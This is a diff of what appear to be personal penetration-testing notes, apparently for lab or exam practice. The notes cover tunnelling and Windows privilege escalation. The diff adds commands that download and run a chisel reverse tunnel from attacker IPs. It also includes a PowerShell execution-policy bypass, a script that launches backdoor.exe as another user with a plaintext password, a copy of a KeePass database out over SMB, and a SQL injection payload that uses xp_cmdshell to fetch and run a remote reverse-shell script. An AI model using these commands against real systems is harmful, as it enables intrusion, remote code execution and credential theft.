@@ -40,9 +40,13 @@ chisel server -p 6969 --reverse
 cd /opt/linux
 python -m http.server 80
 
-wget 192.168.45.178/chisel
+wget 192.168.45.178:8000/chisel
 chmod 777 chisel
-./chisel client 192.168.68.141:6969 R:4444:localhost:8080
+./chisel client 192.168.45.178:6969 R:4444:localhost:8080
+
+wget 10.10.14.8:8000/chisel
+chmod 777 chisel
+./chisel client 10.10.14.8:6969 R:4444:localhost:8080
 
 # Now i can access it on local machine port 4444
 ```
@@ -70,7 +74,22 @@ net use z: \\192.168.49.140\newShare /u:test test
 copy z:\PowerUpSQL.ps1 .
 copy Database.kdbx z:\
 ```
-for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do ( icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%"  )&& echo.
+
+Execute powershell file non-interactively.
+
+```bash
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
+```
+
+Run le as another user with powershell.
+
+```bash
+echo $username = '<username>' > runas.ps1
+echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
